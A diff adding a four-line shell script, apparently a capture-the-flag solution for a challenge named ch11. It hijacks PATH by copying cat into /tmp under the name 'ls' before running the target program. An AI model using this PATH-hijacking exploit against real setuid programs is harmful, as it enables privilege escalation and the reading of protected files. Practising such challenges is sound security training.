@@ -1,0 +1,4 @@
+mkdir /tmp/moi
+cp /bin/cat  /tmp/moi/ls
+export PATH=/tmp/moi/
+./ch11
